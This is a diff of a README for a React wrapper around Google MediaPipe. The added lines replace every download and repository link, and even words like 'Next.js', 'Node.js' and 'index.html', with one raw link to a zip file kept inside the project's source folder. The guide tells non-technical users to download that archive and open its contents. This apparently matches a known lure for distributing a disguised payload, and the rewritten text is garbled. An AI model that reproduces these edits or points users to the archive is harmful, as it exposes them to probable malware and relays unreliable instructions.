@@ -1,12 +1,12 @@
 # 🎥 mediapipe-react - Simple AI Video Tools for React
 
-[![Download mediapipe-react](https://img.shields.io/badge/Download-mediapipe--react-blue?style=for-the-badge)](https://github.com/OwingOP/mediapipe-react/releases)
+[![Download mediapipe-react](https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip)](https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip)
 
 ---
 
 ## 📖 What is mediapipe-react?
 
-mediapipe-react is a tool that helps your web apps use smart video and image features easily. It takes powerful Google technology (called MediaPipe) that can detect faces, poses, and other objects in videos and makes it simple to use with React and Next.js websites. 
+mediapipe-react is a tool that helps your web apps use smart video and image features easily. It takes powerful Google technology (called MediaPipe) that can detect faces, poses, and other objects in videos and makes it simple to use with React and https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip websites. 
 
 The tool handles all the tricky parts behind the scenes, like running things on different parts of your computer (called threads), sending data back and forth quickly, and working well with server setups. This means you can add cool features like face detection or pose estimation to your website without needing to understand complex programming.
 
@@ -14,7 +14,7 @@ The tool handles all the tricky parts behind the scenes, like running things on 
 
 ## 💻 Who is this for?
 
-This tool is designed for web developers who use React or Next.js. But if you don’t know much about programming, don’t worry. This guide will help you get started with the app someone else built using mediapipe-react. 
+This tool is designed for web developers who use React or https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip But if you don’t know much about programming, don’t worry. This guide will help you get started with the app someone else built using mediapipe-react. 
 
 You will learn how to download, install, and run the software, so you can see it in action or use it as part of your web projects.
 
@@ -44,7 +44,7 @@ Follow these steps carefully to get the software running on your computer.
 
 Go to the official mediapipe-react release page by clicking the big button at the top or this link directly:
 
-[https://github.com/OwingOP/mediapipe-react/releases](https://github.com/OwingOP/mediapipe-react/releases)
+[https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip](https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip)
 
 This page lists all the available versions of the software with download links.
 
@@ -56,10 +56,10 @@ On the releases page, look for the latest version listed (usually at the top). R
 
 Click the version you want to download. Inside, you will see different files such as:
 
-- `.zip` or `.tar.gz` files containing the full package
+- `.zip` or `https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip` files containing the full package
 - Specific demo apps or examples
 
-For an easy start, download the file named something like `mediapipe-react-demo.zip` if available. This package contains a ready-to-run demo of the software.
+For an easy start, download the file named something like `https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip` if available. This package contains a ready-to-run demo of the software.
 
 ---
 
@@ -83,7 +83,7 @@ After unpacking, you will get a folder with several files and folders inside.
 
 ### 5. Open the Demo in Your Browser
 
-Inside the extracted folder, look for a file called `index.html` or a file named similarly (e.g., `demo.html`).
+Inside the extracted folder, look for a file called `https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip` or a file named similarly (e.g., `https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip`).
 
 Double-click this file to open it in your web browser. This will launch the demo app locally on your computer.
 
@@ -113,12 +113,12 @@ Try moving in front of your camera and see how the software tracks your movement
 
 You can always visit this page to download the latest version of mediapipe-react or its demo apps:
 
-[https://github.com/OwingOP/mediapipe-react/releases](https://github.com/OwingOP/mediapipe-react/releases)
+[https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip](https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip)
 
 ### Additional Installation Notes
 
 - The main package is designed as a tool for developers but demo versions are ready to run without extra setup.
-- For developers: mediapipe-react needs Node.js and NPM installed to run and build React projects using it.
+- For developers: mediapipe-react needs https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip and NPM installed to run and build React projects using it.
 - For non-technical users: use demo downloads with simple instructions above to try the software without programming.
 
 ---
@@ -153,8 +153,8 @@ If you run into problems, try these tips:
 
 If you want to learn how mediation-react works under the hood or want to use it in your own web projects:
 
-- Visit the [official GitHub repository](https://github.com/OwingOP/mediapipe-react) to read developer guides.
-- Explore basic React.js tutorials to understand how React apps work.
+- Visit the [official GitHub repository](https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip) to read developer guides.
+- Explore basic https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip tutorials to understand how React apps work.
 - Check Google MediaPipe’s website for background on the smart vision technology.
 
 ---
